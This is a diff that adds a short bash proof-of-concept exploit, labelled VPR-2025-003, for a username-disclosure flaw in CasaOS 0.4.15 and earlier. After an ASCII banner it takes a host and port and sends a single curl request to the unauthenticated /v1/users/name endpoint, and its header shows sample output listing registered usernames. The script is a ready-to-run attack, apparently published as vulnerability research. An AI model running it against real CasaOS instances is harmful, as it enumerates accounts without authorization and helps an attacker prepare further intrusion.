@@ -1,0 +1,36 @@
+#!/usr/bin/env bash
+
+# Exploit:          VPR-2025-003
+# Affects:          CasaOS <= 0.4.15
+# Purpose:          Username Disclosure
+# Description:      Reveals information about registered users.
+
+# Created by:       VPR
+# Created:          April 20th, 2025
+
+# Updated by:       VPR
+# Updated:          June 25th, 2025
+
+# Example Output:   {"success":200,"message":"ok","data":["casaos"]}
+
+
+printf \
+"
+ _             _  _  _  _  _  _    _  _  _  _  _
+(_)           (_)(_)(_)(_)(_)(_)_ (_)(_)(_)(_)(_) _
+ (_)         (_) (_)           (_)(_)            (_)
+  (_)       (_)  (_) _  _  _  _(_)(_) _  _  _  _ (_)
+   (_)     (_)   (_)(_)(_)(_)(_)  (_)(_)(_)(_)(_)
+    (_)   (_)    (_)              (_)   (_) _
+     (_)_(_)     (_)              (_)      (_) _
+       (_)       (_)              (_)         (_) _
+                                                 (_) _
+                                                    (_)
+"
+
+DEFAULT_HOST="127.0.0.1"
+DEFAULT_PORT="80"
+HOST="${1:-${DEFAULT_HOST}}"
+PORT="${2:-${DEFAULT_PORT}}"
+
+curl "http://${HOST}:${PORT}/v1/users/name"
